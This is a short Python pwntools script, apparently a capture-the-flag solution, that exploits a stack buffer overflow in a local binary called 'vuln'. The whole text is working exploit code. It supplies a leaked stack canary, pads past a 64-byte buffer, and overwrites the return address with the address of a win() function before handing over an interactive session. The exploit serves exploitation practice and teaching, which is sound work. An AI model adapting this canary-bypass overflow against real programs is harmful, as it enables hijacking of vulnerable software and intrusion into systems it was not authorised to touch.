#!/usr/bin/env python3

from pwn import *

# Your discovered canary
taken = b'TWET'  # Replace with your actual canary

io = process('./vuln')
io.recvuntil(b'> ')

# Calculate size: buffer(64) + canary(4) + padding(16) + return address(4)
size = str(64 + 4 + 16 + 4).encode()
io.sendline(size)

io.recvuntil(b'Input> ')

# Build the final exploit
payload = b'A' * 64           # Fill buffer
payload += taken              # Add correct canary
payload += b'B' * 16          # Padding to reach return address (16 bytes as confirmed)
payload += p32(0x08049336)    # Address of win() function

io.sendline(payload)
io.interactive()
